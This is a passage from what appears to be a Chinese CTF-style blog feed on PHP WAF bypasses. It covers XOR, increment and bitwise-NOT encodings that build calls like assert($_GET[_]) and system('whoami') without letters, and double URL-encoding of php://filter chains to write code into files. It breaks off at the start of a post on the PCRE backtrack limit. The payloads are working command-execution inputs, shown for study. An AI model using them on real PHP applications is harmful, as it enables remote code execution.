参数或路径参数。</p></blockquote><p>比如说我们想执行这个语句</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">assert</span>($_GET[_]);<br></code></pre></td></tr></table></figure><p>先转换assert</p><p><img src="D:/mdimage/image-20220928205111449.png" alt="image-20220928205111449"> </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(&#x27;<span class="hljs-variable">%01</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%05</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%09</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span>&#x27;).<br></code></pre></td></tr></table></figure><p>因为前面这一个题目过滤掉了全部的字母，因此此时能够做变量的字符是剩下了<code>_</code>,于是我们便需要用下划线构造参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7c&#x27;</span>);<br><span class="hljs-comment">//$_=&#x27;assert&#x27;;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%07&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%5d&#x27;</span>);<br><span class="hljs-comment">//$__=&#x27;_GET&#x27;;</span><br></code></pre></td></tr></table></figure><p>先把两个基础函数构造出来</p><p>然后再构造完整的$_GET</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-comment">//$___=&#x27;$_GET&#x27;;</span><br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);<br><span class="hljs-comment">//assert($_GET[_]);</span><br></code></pre></td></tr></table></figure><p>然后我们直接将上述构造的参数全部连接起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7c&#x27;</span>);<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%07&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%5d&#x27;</span>);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);&amp;_=<span class="hljs-title function_ invoke__">phpinfo</span>();<br><br></code></pre></td></tr></table></figure><h3 id="方法二（利用自增运算符）"><a href="#方法二（利用自增运算符）" class="headerlink" title="方法二（利用自增运算符）"></a>方法二（利用自增运算符）</h3><p>倘若把位运算符去掉了，岂不是没有办法执行命令了？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL | E_STRICT);<br><span class="hljs-variable">$_POST</span>[__] = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$_POST</span>[_] = <span class="hljs-string">&#x27;dir&#x27;</span>;<br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;   <span class="hljs-comment">//得到&quot;Array&quot;</span><br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   <span class="hljs-comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$_=&quot;A&quot;</span><br><span class="hljs-variable">$____</span> = <span class="hljs-string">&quot;_&quot;</span>;   <span class="hljs-comment">//$____=&quot;_&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_P&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$_</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_PO&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POS&quot;</span><br><span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POST&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$$____</span>;   <span class="hljs-comment">//$_=$_POST</span><br><span class="hljs-variable">$_</span>[__](<span class="hljs-variable">$_</span>[_]);   <span class="hljs-comment">//—</span><br></code></pre></td></tr></table></figure><p>或者像下面这样</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_1</span>=[].[];<span class="hljs-regexp">//</span>得到一个array字符串<br><span class="hljs-variable">$_</span>= <span class="hljs-variable">$_1</span>[<span class="hljs-number">0</span>];<span class="hljs-regexp">//</span>得到a，就是<span class="hljs-variable">$_</span>是a<br>++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>得到b<br><span class="hljs-variable">$_2</span>=++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>得到c<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_2</span>.++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_1</span>[<span class="hljs-number">1</span>];<span class="hljs-regexp">//</span>chr<br><br><span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$_</span>(<span class="hljs-number">71</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">69</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">84</span>);<span class="hljs-regexp">//</span>chr里面的_get<br>$<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">1</span>&#125;($<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">2</span>&#125;);<br><br></code></pre></td></tr></table></figure><h2 id="当过滤字符较少时"><a href="#当过滤字符较少时" class="headerlink" title="当过滤字符较少时"></a>当过滤字符较少时</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> string<br><br>char = string.printable<br>cmd = <span class="hljs-string">&#x27;system&#x27;</span><br>tmp1,tmp2 = <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> cmd:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char:<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(res)):<br>                tmp1 += i<br>                tmp2 += j<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(tmp1,tmp2))<br><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">PS C:\Users\Administrator&gt; php -r <span class="hljs-string">&quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br>Command line code:1:<br>string(6) <span class="hljs-string">&quot;system&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928225744164.png" alt="image-20220928225744164"> </p><h2 id="另一个payload"><a href="#另一个payload" class="headerlink" title="另一个payload"></a>另一个payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure><p>通过他们之间异或来获得</p><h1 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h1><p>适用PHP版本：当<code>PHP&gt;=7</code>时，可以直接利用取反构造payload</p><p>还是用这一道例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="无参数payload"><a href="#无参数payload" class="headerlink" title="无参数payload"></a>无参数payload</h2><p>我们直接进行取反操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>));<br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928230641649.png" alt="image-20220928230641649"> </p><h2 id="有参数payload"><a href="#有参数payload" class="headerlink" title="有参数payload"></a>有参数payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><br><span class="hljs-comment">//结果如下：</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%8C%86%8C%8B%9A%92&quot;</span> <span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%88%97%90%9E%92%96&quot;</span><br></code></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220929160845063.png" alt="image-20220929160845063"> </p><h2 id="URL双写绕过"><a href="#URL双写绕过" class="headerlink" title="URL双写绕过"></a>URL双写绕过</h2><h3 id="最简单的考法"><a href="#最简单的考法" class="headerlink" title="最简单的考法"></a>最简单的考法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/hackerDJ/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;hackerDJ&quot;</span> == <span class="hljs-variable">$id</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>因为在提交的时候服务器会对url进行一次解码，所以我们需要双写绕过</p><p>但是我们一般不会考这么简单的</p><h3 id="file-put-content"><a href="#file-put-content" class="headerlink" title="file_put_content"></a>file_put_content</h3><p>先查这玩意的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">php_stream_apply_filter_list</span>(php_stream *stream, char *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain) <span class="hljs-comment">/* &#123;&#123;&#123; */</span><br>&#123;<br>char *p, *token = <span class="hljs-literal">NULL</span>;<br>php_stream_filter *temp_filter;<br><br>p = <span class="hljs-title function_ invoke__">php_strtok_r</span>(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br><span class="hljs-keyword">while</span> (p) &#123;<br><span class="hljs-title function_ invoke__">php_url_decode</span>(p, <span class="hljs-title function_ invoke__">strlen</span>(p));<span class="hljs-comment">#👈对过滤器进行了一次urldecode</span><br><span class="hljs-keyword">if</span> (read_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = <span class="hljs-title function_ invoke__">php_stream_filter_create</span>(p, <span class="hljs-literal">NULL</span>, <span class="hljs-title function_ invoke__">php_stream_is_persistent</span>(stream)))) &#123;<br><span class="hljs-title function_ invoke__">php_stream_filter_append</span>(&amp;stream-&gt;readfilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">php_error_docref</span>(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (write_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = <span class="hljs-title function_ invoke__">php_stream_filter_create</span>(p, <span class="hljs-literal">NULL</span>, <span class="hljs-title function_ invoke__">php_stream_is_persistent</span>(stream)))) &#123;<br><span class="hljs-title function_ invoke__">php_stream_filter_append</span>(&amp;stream-&gt;writefilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">php_error_docref</span>(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br>p = <span class="hljs-title function_ invoke__">php_strtok_r</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们可以双写绕过</p><p>但是一般服务器会把我们那么简单的绕过给ban掉</p><p>所以我们可以用下面这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#构造r的二次编码</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;<br><span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>比如原来是</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13|cuc cucvasb();|/</span>resource=Cyc1e.php<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span>: %<span class="hljs-number">7</span>%<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>根据重编码的结果替换r</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.%7%32ot13|cuc cucvasb();|/</span>resource=Cyc1e.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP PCRE</title>
    <link href="/Decemberus.github-io/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/"/>
    <url>/Decemberus.github-io/2022/01/09/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h2><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p><p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul><p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p><h2 id="回溯的过程是什么样子的"><a href="#回溯的过程是什么样子的" class="headerlink" title="回溯的过程是什么样子的"></a>回溯的过程是什么样子的</h2><p>所以，我们题目中的正则<code>&lt;\?.*[(;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p><p><img src="D:\mdimage\image-20221004182355365.png" alt="image-20221004182355365"> </p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符[(&#96;;?&gt;]。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(</code>;?&gt;]<code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配</code>;<code>，14步匹配</code>.<em><code>，第二个</code>.</em>&#96;匹配到了字符串末尾，最后结束匹配。</p><p>在调试正则表达式的时候，我们可以查看当前回溯的次数：</p><p><img src="D:\mdimage\image-20221004183012814.png" alt="image-20221004183012814"> </p><p>这里回溯了8次。</p><h2 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" 